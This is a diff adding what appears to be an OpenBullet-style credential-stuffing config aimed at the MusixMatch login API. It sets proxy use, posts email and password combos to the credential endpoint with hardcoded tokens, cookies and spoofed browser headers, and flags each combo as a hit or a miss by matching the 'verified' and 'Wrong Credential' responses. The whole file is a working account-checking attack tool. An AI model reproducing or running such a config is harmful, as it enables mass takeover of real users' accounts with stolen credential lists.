@@ -1,0 +1,39 @@
+[SETTINGS]
+{
+  "Name": "MusixMatch",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-20T01:04:07.1356174+00:00",
+  "AdditionalInfo": "email is Caps sensitive example | BlackPanther@gmail.com = fail | blackPanther@gmail.com = success |",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.musixmatch.com/ws/1.1/credential.post?format=json&cache_key=47c075ab8c2f2355b276f3a43abda5bcd7936451&app_id=community-app-v1.0&usertoken=180520574373ba07e07d0b9e9d78f9d4d855a27771d29ef48f04e9&guid=40d04dc1-0c8c-432b-826a-30e7c71a8425&signature=dHxQQZPwnlgMIXurQbQfkB2em98%3D&signature_protocol=sha1" AutoRedirect=TRUE 
+  CONTENT "{\"credential_list\":[{\"credential\":{\"type\":\"mxm\",\"action\":\"login\",\"email\":\"<USER>\",\"password\":\"<PASS>\"}}]}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "cookie: mxm_bab=BB; _ga=GA1.2.49023739.1526777640; _gid=GA1.2.390860470.1526777640; translate_lang=%7B%22key%22%3A%22en%22%2C%22name%22%3A%22English%22%7D; musixmatchUserGuid=40d04dc1-0c8c-432b-826a-30e7c71a8425; accountProviderName=musixmatch; musixmatchUserToken=180520574373ba07e07d0b9e9d78f9d4d855a27771d29ef48f04e9; userInfo=; userLoggedin=false; accountProviderUserToken=; _gat=1" 
+  HEADER "Accept: */*\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.5" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: www.musixmatch.com" 
+  HEADER "Referer: https://www.musixmatch.com/sign-in" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\":\"Wrong Credential\"}}}]}}" 
+  KEYCHAIN Success OR 
+    KEY "verified\":true,\"" 
